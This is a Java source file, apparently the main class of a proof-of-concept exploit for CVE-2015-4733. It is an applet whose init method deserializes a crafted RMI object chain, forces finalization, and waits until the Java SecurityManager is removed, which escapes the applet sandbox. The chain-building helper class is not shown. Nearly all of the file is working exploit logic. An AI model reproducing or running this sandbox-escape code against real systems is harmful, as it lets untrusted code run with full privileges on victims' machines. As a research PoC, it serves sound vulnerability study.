package poc.cve_2015_4733;

import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

import poc.shared.Utils;

public class Main extends Applet {

	
	private static final long serialVersionUID = -7960035070648778227L;
	
	
	private static void disableSecurity( ) {
		try {
			Utils.enter( "Disable SecurityManager" );
			
			Utils.log( "Creating RMI Object chain." );
			byte[] chain = RMIChain.createChain();
			
			Utils.log( "Reading in RMI Object chain." );
			ObjectInputStream objIn = new ObjectInputStream( new ByteArrayInputStream( chain ) );
			objIn.readObject( );
			objIn = null;
			
			Utils.log( "Invoking finalizers." );
			System.gc( );
			System.runFinalization();
			
			Utils.log( "Waiting for secondary read completion." );
			while( System.getSecurityManager() != null );
			Utils.log( "Secondary read completed." );
			Utils.log( "SecurityManager removed." );
		}
		catch ( Throwable e ) {
			Utils.log( "Error removing SecurityManager." );
			e.printStackTrace();
		}
		finally {
			Utils.exit();
		}
	}
	
	
	@Override
	public void init( ) {
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
		Main.disableSecurity();
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
	}
	
}
